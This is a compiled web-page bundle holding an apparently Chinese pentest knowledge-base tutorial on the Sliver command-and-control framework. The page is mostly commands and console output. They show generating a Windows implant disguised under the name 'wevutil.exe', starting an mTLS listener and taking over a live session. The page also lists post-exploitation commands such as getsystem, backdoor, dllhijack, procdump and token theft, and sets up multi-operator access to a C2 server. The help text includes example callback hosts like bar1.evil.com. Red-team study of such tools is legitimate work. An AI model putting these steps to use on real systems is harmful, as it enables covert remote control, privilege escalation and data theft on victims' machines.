"use strict";(self.webpackChunkblog_source_2025=self.webpackChunkblog_source_2025||[]).push([[9608],{28453:(e,n,t)=>{t.d(n,{R:()=>a,x:()=>r});var i=t(96540);const s={},o=i.createContext(s);function a(e){const n=i.useContext(o);return i.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:a(e.components),i.createElement(o.Provider,{value:n},e.children)}},54789:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>r,default:()=>h,frontMatter:()=>a,metadata:()=>i,toc:()=>c});const i=JSON.parse('{"id":"\u6e17\u900f\u6d4b\u8bd5/C2/\u5176\u4ed6C2/Sliver\u521d\u4f53\u9a8c","title":"Sliver\u521d\u4f53\u9a8c","description":"\u5b98\u65b9\u5730\u5740","source":"@site/docs/01.\u6e17\u900f\u6d4b\u8bd5/10.C2/03.\u5176\u4ed6C2/02.Sliver\u521d\u4f53\u9a8c.md","sourceDirName":"01.\u6e17\u900f\u6d4b\u8bd5/10.C2/03.\u5176\u4ed6C2","slug":"/\u6e17\u900f\u6d4b\u8bd5/C2/\u5176\u4ed6C2/Sliver\u521d\u4f53\u9a8c","permalink":"/docs/\u6e17\u900f\u6d4b\u8bd5/C2/\u5176\u4ed6C2/Sliver\u521d\u4f53\u9a8c","draft":false,"unlisted":false,"tags":[],"version":"current","lastUpdatedBy":"d4m1ts_mini","lastUpdatedAt":1761469028000,"sidebarPosition":2,"frontMatter":{},"sidebar":"knowledgeBaseSidebar","previous":{"title":"\u5217\u8868\u5408\u96c6","permalink":"/docs/\u6e17\u900f\u6d4b\u8bd5/C2/\u5176\u4ed6C2/\u5217\u8868\u5408\u96c6"},"next":{"title":"powershell","permalink":"/docs/category/powershell"}}');var s=t(74848),o=t(28453);const a={},r="Sliver\u521d\u4f53\u9a8c",l={},c=[{value:"\u5b98\u65b9\u5730\u5740",id:"\u5b98\u65b9\u5730\u5740",level:2},{value:"\u5355\u4eba\u4f7f\u7528",id:"\u5355\u4eba\u4f7f\u7528",level:2},{value:"\u542f\u52a8&amp;\u5e2e\u52a9",id:"\u542f\u52a8\u5e2e\u52a9",level:3},{value:"\u751f\u6210\u4e0a\u7ebfexe",id:"\u751f\u6210\u4e0a\u7ebfexe",level:3},{value:"\u5f00\u542f\u76d1\u542c",id:"\u5f00\u542f\u76d1\u542c",level:3},{value:"\u67e5\u770b\u5f53\u524d\u4efb\u52a1",id:"\u67e5\u770b\u5f53\u524d\u4efb\u52a1",level:3},{value:"\u67e5\u770b\u4e0a\u7ebf\u5217\u8868",id:"\u67e5\u770b\u4e0a\u7ebf\u5217\u8868",level:3},{value:"\u591a\u4eba\u534f\u540c",id:"\u591a\u4eba\u534f\u540c",level:2},{value:"\u542f\u52a8&amp;\u751f\u6210client\u914d\u7f6e",id:"\u542f\u52a8\u751f\u6210client\u914d\u7f6e",level:3},{value:"client\u542f\u52a8",id:"client\u542f\u52a8",level:3}];function d(e){const n={a:"a",admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,o.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.header,{children:(0,s.jsx)(n.h1,{id:"sliver\u521d\u4f53\u9a8c",children:"Sliver\u521d\u4f53\u9a8c"})}),"\n",(0,s.jsx)(n.h2,{id:"\u5b98\u65b9\u5730\u5740",children:"\u5b98\u65b9\u5730\u5740"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://github.com/BishopFox/sliver",children:"GitHub\u5730\u5740"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://github.com/BishopFox/sliver/releases/latest",children:"\u4e8c\u8fdb\u5236\u4e0b\u8f7d\u76f4\u8fbe"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://sliver.sh/tutorials",children:"\u6587\u6863\u5730\u5740"})}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"Alt text",src:t(56315).A+"",width:"962",height:"514"})}),"\n",(0,s.jsx)(n.admonition,{type:"tip",children:(0,s.jsx)(n.p,{children:"\u6240\u6709\u547d\u4ee4\u5747\u652f\u6301Tab\u81ea\u52a8\u8865\u9f50"})}),"\n",(0,s.jsx)(n.h2,{id:"\u5355\u4eba\u4f7f\u7528",children:"\u5355\u4eba\u4f7f\u7528"}),"\n",(0,s.jsx)(n.h3,{id:"\u542f\u52a8\u5e2e\u52a9",children:"\u542f\u52a8&\u5e2e\u52a9"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"// highlight-next-line\n# ./sliver-server_linux \n\n    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2557     \u2588\u2588\u2557\u2588\u2588\u2557   \u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557\n    \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2551     \u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\n    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551     \u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\n    \u255a\u2550\u2550\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2551     \u2588\u2588\u2551\u255a\u2588\u2588\u2557 \u2588\u2588\u2554\u255d\u2588\u2588\u2554\u2550\u2550\u255d  \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\n    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551  \u2588\u2588\u2551\n    \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u2550\u2550\u255d  \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d\n\nAll hackers gain prowess\n[*] Server v1.5.43 - e116a5ec3d26e8582348a29cfd251f915ce4a405\n[*] Welcome to the sliver shell, please type 'help' for options\n\n[*] Check for updates with the 'update' command\n\n// highlight-next-line\n[server] sliver > help\n\nCommands:\n=========\n  clear       clear the screen\n  exit        exit the shell\n  help        use 'help [command]' for command help\n  monitor     Monitor threat intel platforms for Sliver implants\n  wg-config   Generate a new WireGuard client config\n  wg-portfwd  List ports forwarded by the WireGuard tun interface\n  wg-socks    List socks servers listening on the WireGuard tun interface\n\n\nGeneric:\n========\n  aliases           List current aliases\n  armory            Automatically download and install extensions/aliases\n  background        Background an active session\n  beacons           Manage beacons\n  builders          List external builders\n  canaries          List previously generated canaries\n  cursed            Chrome/electron post-exploitation tool kit (\u2229\uff40-\xb4)\u2283\u2501\u2606\uff9f.*\uff65\uff61\uff9f\n  dns               Start a DNS listener\n  env               List environment variables\n  generate          Generate an implant binary\n  hosts             Manage the database of hosts\n  http              Start an HTTP listener\n  https             Start an HTTPS listener\n  implants          List implant builds\n  jobs              Job control\n  licenses          Open source licenses\n  loot              Manage the server's loot store\n  mtls              Start an mTLS listener\n  prelude-operator  Manage connection to Prelude's Operator\n  profiles          List existing profiles\n  reaction          Manage automatic reactions to events\n  regenerate        Regenerate an implant\n  sessions          Session management\n  settings          Manage client settings\n  stage-listener    Start a stager listener\n  tasks             Beacon task management\n  update            Check for updates\n  use               Switch the active session or beacon\n  version           Display version information\n  websites          Host static content (used with HTTP C2)\n  wg                Start a WireGuard listener\n\n\nMultiplayer:\n============\n  kick-operator  Kick an operator from the server\n  multiplayer    Enable multiplayer mode\n  new-operator   Create a new operator config file\n  operators      Manage operators\n\n\nFor even more information, please see our wiki: https://github.com/BishopFox/sliver/wiki\n\n// highlight-next-line\n[server] sliver > help generate \n\nCommand: generate <options>\nAbout: Generate a new sliver binary and saves the output to the cwd or a path specified with --save.\n\n++ Command and Control ++\nYou must specificy at least one c2 endpoint when generating an implant, this can be one or more of --mtls, --wg, --http, or --dns, --named-pipe, or --tcp-pivot.\nThe command requires at least one use of --mtls, --wg, --http, or --dns, --named-pipe, or --tcp-pivot.\n\nThe follow command is used to generate a sliver Windows executable (PE) file, that will connect back to the server using mutual-TLS:\n        generate --mtls foo.example.com \n\nThe follow command is used to generate a sliver Windows executable (PE) file, that will connect back to the server using Wireguard on UDP port 9090,\nthen connect to TCP port 1337 on the server's virtual tunnel interface to retrieve new wireguard keys, re-establish the wireguard connection using the new keys, \nthen connect to TCP port 8888 on the server's virtual tunnel interface to establish c2 comms.\n        generate --wg 3.3.3.3:9090 --key-exchange 1337 --tcp-comms 8888\n\nYou can also stack the C2 configuration with multiple protocols:\n        generate --os linux --mtls example.com,domain.com --http bar1.evil.com,bar2.attacker.com --dns baz.bishopfox.com\n\n\n++ Formats ++\nSupported output formats are Windows PE, Windows DLL, Windows Shellcode, Mach-O, and ELF. The output format is controlled\nwith the --os and --format flags.\n\nTo output a 64bit Windows PE file (defaults to WinPE/64bit), either of the following command would be used:\n        generate --mtls foo.example.com \n        generate --os windows --arch 64bit --mtls foo.example.com\n\nA Windows DLL can be generated with the following command:\n        generate --format shared --mtls foo.example.com\n\nTo output a MacOS Mach-O executable file, the following command would be used\n        generate --os mac --mtls foo.example.com \n\nTo output a Linux ELF executable file, the following command would be used:\n        generate --os linux --mtls foo.example.com \n\n\n++ DNS Canaries ++\nDNS canaries are unique per-binary domains that are deliberately NOT obfuscated during the compilation process. \nThis is done so that these unique domains show up if someone runs 'strings' on the binary, if they then attempt \nto probe the endpoint or otherwise resolve the domain you'll be alerted that your implant has been discovered, \nand which implant file was discovered along with any affected sessions.\n\nImportant: You must have a DNS listener/server running to detect the DNS queries (see the \"dns\" command).\n\nUnique canary subdomains are automatically generated and inserted using the --canary flag. You can view previously generated \ncanaries and their status using the \"canaries\" command:\n        generate --mtls foo.example.com --canary 1.foobar.com\n\n++ Execution Limits ++\nExecution limits can be used to restrict the execution of a Sliver implant to machines with specific configurations.\n\n++ Profiles ++\nDue to the large number of options and C2s this can be a lot of typing. If you'd like to have a reusable a Sliver config\nsee 'help profiles new'. All \"generate\" flags can be saved into a profile, you can view existing profiles with the \"profiles\"\ncommand.\n\n\nUsage:\n======\n  generate [flags]\n\nFlags:\n======\n  -a, --arch               string    cpu architecture (default: amd64)\n  -c, --canary             string    canary domain(s)\n  -d, --debug                        enable debug features\n  -O, --debug-file         string    path to debug output\n  -G, --disable-sgn                  disable shikata ga nai shellcode encoder\n  -n, --dns                string    dns connection strings\n  -e, --evasion                      enable evasion features (e.g. overwrite user space hooks)\n  -E, --external-builder             use an external builder\n  -f, --format             string    Specifies the output formats, valid values are: 'exe', 'shared' (for dynamic libraries), 'service' (see `psexec` for more info) and 'shellcode' (windows only) (default: exe)\n  -h, --help                         display help\n  -b, --http               string    http(s) connection strings\n  -X, --key-exchange       int       wg key-exchange port (default: 1337)\n  -w, --limit-datetime     string    limit execution to before datetime\n  -x, --limit-domainjoined           limit execution to domain joined machines\n  -F, --limit-fileexists   string    limit execution to hosts with this file in the filesystem\n  -z, --limit-hostname     string    limit execution to specified hostname\n  -L, --limit-locale       string    limit execution to hosts that match this locale\n  -y, --limit-username     string    limit execution to specified username\n  -k, --max-errors         int       max number of connection errors (default: 1000)\n  -m, --mtls               string    mtls connection strings\n  -N, --name               string    agent name\n  -p, --named-pipe         string    named-pipe connection strings\n  -o, --os                 string    operating system (default: windows)\n  -P, --poll-timeout       int       long poll request timeout (default: 360)\n  -j, --reconnect          int       attempt to reconnect every n second(s) (default: 60)\n  -R, --run-at-load                  run the implant entrypoint from DllMain/Constructor (shared library only)\n  -s, --save               string    directory/file to the binary to\n  -l, --skip-symbols                 skip symbol obfuscation\n  -Z, --strategy           string    specify a connection strategy (r = random, rd = random domain, s = sequential)\n  -T, --tcp-comms          int       wg c2 comms port (default: 8888)\n  -i, --tcp-pivot          string    tcp-pivot connection strings\n  -I, --template           string    implant code template (default: sliver)\n  -t, --timeout            int       command timeout in seconds (default: 60)\n  -g, --wg                 string    wg connection strings\n\nSub Commands:\n=============\n  beacon  Generate a beacon binary\n  info    Get information about the server's compiler\n  stager  Generate a stager using Metasploit (requires local Metasploit installation)\n\n[server] sliver >  \n"})}),"\n",(0,s.jsx)(n.h3,{id:"\u751f\u6210\u4e0a\u7ebfexe",children:"\u751f\u6210\u4e0a\u7ebfexe"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"[server] sliver > generate --mtls <IP:PORT> --os windows --save wevutil.exe\n\n# \u67e5\u770b\u5386\u53f2\u547d\u4ee4\nimplants\n"})}),"\n",(0,s.jsx)(n.h3,{id:"\u5f00\u542f\u76d1\u542c",children:"\u5f00\u542f\u76d1\u542c"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"[server] sliver > mtls -l <PORT>\n"})}),"\n",(0,s.jsx)(n.h3,{id:"\u67e5\u770b\u5f53\u524d\u4efb\u52a1",children:"\u67e5\u770b\u5f53\u524d\u4efb\u52a1"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"// highlight-next-line\n[server] sliver > jobs\n\n ID   Name   Protocol   Port    Stage Profile \n==== ====== ========== ======= ===============\n 1    mtls   tcp        32321                 \n"})}),"\n",(0,s.jsx)(n.h3,{id:"\u67e5\u770b\u4e0a\u7ebf\u5217\u8868",children:"\u67e5\u770b\u4e0a\u7ebf\u5217\u8868"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"// highlight-next-line\n[server] sliver > sessions \n\n ID         Transport   Remote Address          Hostname      Username   Operating System   Health  \n========== =========== ======================= ============= ========== ================== =========\n 31d5d995   mtls        100.100.100.200:47876   XX-XXX-XXXX   XXX        windows/amd64      [ALIVE] \n"})}),"\n",(0,s.jsx)(n.p,{children:"\u8fde\u63a5\u76ee\u6807"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"sessions -i <ID>\n\nuse\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u540e\u7eed\u548cMSF\u64cd\u4f5c\u4e00\u81f4\uff0c\u53ef\u6267\u884c\u4efb\u610f\u64cd\u4f5c"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"[server] sliver (MECHANICAL_ZITHER) > help\n\nCommands:\n=========\n  clear       clear the screen\n  exit        exit the shell\n  help        use 'help [command]' for command help\n  monitor     Monitor threat intel platforms for Sliver implants\n  wg-config   Generate a new WireGuard client config\n  wg-portfwd  List ports forwarded by the WireGuard tun interface\n  wg-socks    List socks servers listening on the WireGuard tun interface\n\n\nGeneric:\n========\n  aliases           List current aliases\n  armory            Automatically download and install extensions/aliases\n  background        Background an active session\n  beacons           Manage beacons\n  builders          List external builders\n  canaries          List previously generated canaries\n  cursed            Chrome/electron post-exploitation tool kit (\u2229\uff40-\xb4)\u2283\u2501\u2606\uff9f.*\uff65\uff61\uff9f\n  dns               Start a DNS listener\n  env               List environment variables\n  generate          Generate an implant binary\n  hosts             Manage the database of hosts\n  http              Start an HTTP listener\n  https             Start an HTTPS listener\n  implants          List implant builds\n  jobs              Job control\n  licenses          Open source licenses\n  loot              Manage the server's loot store\n  mtls              Start an mTLS listener\n  prelude-operator  Manage connection to Prelude's Operator\n  profiles          List existing profiles\n  reaction          Manage automatic reactions to events\n  regenerate        Regenerate an implant\n  sessions          Session management\n  settings          Manage client settings\n  stage-listener    Start a stager listener\n  tasks             Beacon task management\n  update            Check for updates\n  use               Switch the active session or beacon\n  version           Display version information\n  websites          Host static content (used with HTTP C2)\n  wg                Start a WireGuard listener\n\n\nMultiplayer:\n============\n  kick-operator  Kick an operator from the server\n  multiplayer    Enable multiplayer mode\n  new-operator   Create a new operator config file\n  operators      Manage operators\n\n\nSliver - Windows:\n=================\n  backdoor          Infect a remote file with a sliver shellcode\n  dllhijack         Plant a DLL for a hijack scenario\n  execute-assembly  Loads and executes a .NET assembly in a child process (Windows Only)\n  getprivs          Get current privileges (Windows only)\n  getsystem         Spawns a new sliver session as the NT AUTHORITY\\SYSTEM user (Windows Only)\n  impersonate       Impersonate a logged in user.\n  make-token        Create a new Logon Session with the specified credentials\n  migrate           Migrate into a remote process\n  psexec            Start a sliver service on a remote target\n  registry          Windows registry operations\n  rev2self          Revert to self: lose stolen Windows token\n  runas             Run a new process in the context of the designated user (Windows Only)\n  spawndll          Load and execute a Reflective DLL in a remote process\n\n\nSliver:\n=======\n  cat                Dump file to stdout\n  cd                 Change directory\n  chmod              Change permissions on a file or directory\n  chown              Change owner on a file or directory\n  chtimes            Change access and modification times on a file (timestomp)\n  close              Close an interactive session without killing the remote process\n  download           Download a file\n  execute            Execute a program on the remote system\n  execute-shellcode  Executes the given shellcode in the sliver process\n  extensions         Manage extensions\n  getgid             Get session process GID\n  getpid             Get session pid\n  getuid             Get session process UID\n  ifconfig           View network interface configurations\n  info               Get info about session\n  interactive        Task a beacon to open an interactive session (Beacon only)\n  kill               Kill a session\n  ls                 List current directory\n  memfiles           List current memfiles\n  mkdir              Make a directory\n  msf                Execute an MSF payload in the current process\n  msf-inject         Inject an MSF payload into a process\n  mv                 Move or rename a file\n  netstat            Print network connection information\n  ping               Send round trip message to implant (does not use ICMP)\n  pivots             List pivots for active session\n  portfwd            In-band TCP port forwarding\n  procdump           Dump process memory\n  ps                 List remote processes\n  pwd                Print working directory\n  reconfig           Reconfigure the active beacon/session\n  rename             Rename the active beacon/session\n  rm                 Remove a file or directory\n  rportfwd           reverse port forwardings\n  screenshot         Take a screenshot\n  shell              Start an interactive shell\n  shikata-ga-nai     Polymorphic binary shellcode encoder (\u30ce \u309c\u0414\u309c)\u30ce \ufe35 \u4ed5\u65b9\u304c\u306a\u3044\n  sideload           Load and execute a shared object (shared library/DLL) in a remote process\n  socks5             In-band SOCKS5 Proxy\n  ssh                Run a SSH command on a remote host\n  terminate          Terminate a process on the remote system\n  upload             Upload a file\n  whoami             Get session user execution context\n\n\nFor even more information, please see our wiki: https://github.com/BishopFox/sliver/wiki\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"image-20250717120744900",src:t(94179).A+"",width:"2136",height:"672"})}),"\n",(0,s.jsx)(n.h2,{id:"\u591a\u4eba\u534f\u540c",children:"\u591a\u4eba\u534f\u540c"}),"\n",(0,s.jsx)(n.h3,{id:"\u542f\u52a8\u751f\u6210client\u914d\u7f6e",children:"\u542f\u52a8&\u751f\u6210client\u914d\u7f6e"}),"\n",(0,s.jsx)(n.p,{children:"\u4e3b\u8981\u662fhelp\u7684\u8fd9\u4e00\u90e8\u5206\u529f\u80fd"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"Multiplayer:\n============\n  kick-operator  Kick an operator from the server\n  multiplayer    Enable multiplayer mode\n  new-operator   Create a new operator config file\n  operators      Manage operators\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u751f\u6210\u534f\u540c\u4eba\u5458\u914d\u7f6e"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"// highlight-next-line\n[server] sliver > new-operator --name d4m1ts -l 47.109.148.70 -s d4m1ts.cfg\n\n[*] Generating new client certificate, please wait ... \n[*] Saved new client config to: /root/test/d4m1ts.cfg \n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5f00\u542f\u591a\u4eba\u534f\u540c"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"// highlight-next-line\n[server] sliver > multiplayer\n\n[*] Multiplayer mode enabled!\n"})}),"\n",(0,s.jsx)(n.h3,{id:"client\u542f\u52a8",children:"client\u542f\u52a8"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"// highlight-next-line\n# ./sliver-client_linux import d4m1ts.cfg \n2025/07/17 13:43:40 Saved new client config to: /root/.sliver-client/configs/d4m1ts_47.109.148.70.cfg\n\n// highlight-next-line\n# ./sliver-client_linux \nConnecting to 47.109.148.70:31337 ...\n\n          \u2588\u2588\u2588\u2588\u2588\u2588  \u2588\u2588\u2593     \u2588\u2588\u2593 \u2588\u2588\u2592   \u2588\u2593\u2593\u2588\u2588\u2588\u2588\u2588  \u2588\u2588\u2580\u2588\u2588\u2588\n        \u2592\u2588\u2588    \u2592 \u2593\u2588\u2588\u2592    \u2593\u2588\u2588\u2592\u2593\u2588\u2588\u2591   \u2588\u2592\u2593\u2588   \u2580 \u2593\u2588\u2588 \u2592 \u2588\u2588\u2592\n        \u2591 \u2593\u2588\u2588\u2584   \u2592\u2588\u2588\u2591    \u2592\u2588\u2588\u2592 \u2593\u2588\u2588  \u2588\u2592\u2591\u2592\u2588\u2588\u2588   \u2593\u2588\u2588 \u2591\u2584\u2588 \u2592\n          \u2592   \u2588\u2588\u2592\u2592\u2588\u2588\u2591    \u2591\u2588\u2588\u2591  \u2592\u2588\u2588 \u2588\u2591\u2591\u2592\u2593\u2588  \u2584 \u2592\u2588\u2588\u2580\u2580\u2588\u2584\n        \u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u2591\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2591\u2588\u2588\u2591   \u2592\u2580\u2588\u2591  \u2591\u2592\u2588\u2588\u2588\u2588\u2592\u2591\u2588\u2588\u2593 \u2592\u2588\u2588\u2592\n        \u2592 \u2592\u2593\u2592 \u2592 \u2591\u2591 \u2592\u2591\u2593  \u2591\u2591\u2593     \u2591 \u2590\u2591  \u2591\u2591 \u2592\u2591 \u2591\u2591 \u2592\u2593 \u2591\u2592\u2593\u2591\n        \u2591 \u2591\u2592  \u2591 \u2591\u2591 \u2591 \u2592  \u2591 \u2592 \u2591   \u2591 \u2591\u2591   \u2591 \u2591  \u2591  \u2591\u2592 \u2591 \u2592\u2591\n        \u2591  \u2591  \u2591    \u2591 \u2591    \u2592 \u2591     \u2591\u2591     \u2591     \u2591\u2591   \u2591\n                  \u2591      \u2591  \u2591 \u2591        \u2591     \u2591  \u2591   \u2591\n\nAll hackers gain renown\n[*] Server v1.5.43 - e116a5ec3d26e8582348a29cfd251f915ce4a405\n[*] Welcome to the sliver shell, please type 'help' for options\n\n[*] Check for updates with the 'update' command\n\nsliver >  \n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5176\u4ed6\u64cd\u4f5c\u548c\u5355\u4eba\u7684\u4e00\u81f4\u3002"})]})}function h(e={}){const{wrapper:n}={...(0,o.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(d,{...e})}):d(e)}},56315:(e,n,t)=>{t.d(n,{A:()=>i});const i=t.p+"assets/images/Architecture-20250717114319796-4d52ba0395d60e01fb7adf6e74640a6f.png"},94179:(e,n,t)=>{t.d(n,{A:()=>i});const i=t.p+"assets/images/image-20250717120744900-9cc003c7f4ea0ecd2526402e33a47171.png"}}]);